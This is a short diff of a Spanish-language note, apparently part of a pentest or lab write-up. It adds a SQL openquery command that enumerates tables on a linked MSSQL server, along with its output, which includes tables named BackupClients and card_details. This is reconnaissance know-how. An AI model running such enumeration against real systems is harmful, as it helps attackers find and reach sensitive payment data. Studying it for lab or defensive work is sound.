@@ -199,7 +199,22 @@ clients
 `Seguimos enumerando`
 
 ```python
-select * from openquery("web\clients", 'select name from clients..sysobjects');
+
+1> select * from openquery("web\clients", 'select name from clients..sysobjects');
+2> go
+
+BackupClients
+card_details
+QueryNotificationErrorsQueue
+queue_messages_1977058079
+EventNotificationErrorsQueue
+queue_messages_2009058193
+ServiceBrokerQueue
+queue_messages_2041058307
+(8 rows affected)
+
+1>
+
 ```
 
 ![[Pasted image 20240714160548.png]]
